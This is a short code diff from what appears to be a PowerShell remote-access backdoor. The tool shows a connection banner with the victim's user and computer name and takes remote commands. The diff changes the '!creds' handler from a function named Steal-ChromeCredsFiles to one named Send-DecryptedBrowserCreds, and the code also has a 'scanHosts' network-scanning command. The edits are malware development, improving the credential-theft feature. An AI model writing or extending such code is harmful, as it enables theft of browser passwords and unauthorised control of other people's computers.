@@ -736,7 +736,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            TIO                                                                                                                                                                    
+                                            AAAA                                                                                                                                                                   
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
@@ -795,8 +795,8 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                         $response = Tree-List
                     }
                     elseif ($cmd -eq "!creds") {
-                        $response = Steal-ChromeCredsFiles
-                    }
+                            $response = Send-DecryptedBrowserCreds
+                        }
                     elseif ($cmd -eq "scanHosts") {
                         Get-AliveHosts -stream $stream
                         $response = ""
